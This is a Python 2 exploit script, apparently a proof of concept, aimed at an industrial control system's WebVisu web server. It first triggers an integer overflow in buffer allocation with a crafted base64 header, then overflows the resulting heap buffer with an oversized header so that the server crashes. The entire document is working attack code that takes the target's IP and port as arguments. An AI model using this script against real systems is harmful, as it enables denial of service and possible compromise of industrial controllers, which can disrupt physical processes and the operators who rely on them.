import sys, struct, base64 
from httplib import *

def usage():
  print "usage  : "+sys.argv[0] + " <target_ip> <target_port>"
  print "example: "+sys.argv[0] + " 192.168.1.123 8080"

if len(sys.argv) != 3:
  usage()
  sys.exit()

host = str(sys.argv[1])
port = int(sys.argv[2]) 

if(port == 443):
  conn = HTTPSConnection(host, port)
else:
  conn = HTTPConnection(host, port)
  

# Request 1: Allocate a small communication buffer on the heap
print "Issue WEB_CLIENT_OPENCONNECTION to allocate a small comm buffer via int32 overflow..."
url = "/WebVisuV3"

# int32 oveflow in SysMemAllocData():
#   (-1 + 0x5c) & 0xffffffff = 0x5b 
open_conn = base64.b64encode("\x01\x00\x00\x00" + "|foo|-1|true|")
headers = {"Connection":"keep-alive", "3S-Repl-Content":open_conn}
conn.request("POST", url, "", headers)
res = conn.getresponse()
print res.status, res.reason
if res.status != 200:
  sys.exit("WEB_CLIENT_OPENCONNECTION failed")

print res.read()

# Request 2: Issue WEB_CLIENT_RUN_SERVICE to overflow the comm buffer
print "Issuing WEB_CLIENT_RUN_SERVICE to overflow the comm buffer..."

# Cause BTagReaderMoveNext() to fail and HandleVisuService() 
# to return ERR_OK
body = 'B' * 10

hdr =  struct.pack("<H", 4)
hdr += struct.pack("<H", 1)
hdr += struct.pack("<L", 0)
hdr += struct.pack("<L", len(body))
hdr += struct.pack("<H", 0)
hdr += struct.pack("<H", 0)

# long hdr -> heap buf overflow
hdr += "A" * 0x4000

run_svc = "\x02\x00\x00\x00"
run_svc += struct.pack("<H", 0xcd55)
run_svc += struct.pack("<H", len(hdr))
run_svc += hdr
run_svc += body 

run_svc  = base64.b64encode(run_svc)
headers = {"Connection":"keep-alive", "3S-Repl-Content":run_svc}
conn.request("POST", url, "", headers)
# Web server should die
res = conn.getresponse()
print res.status, res.reason
print res.read()

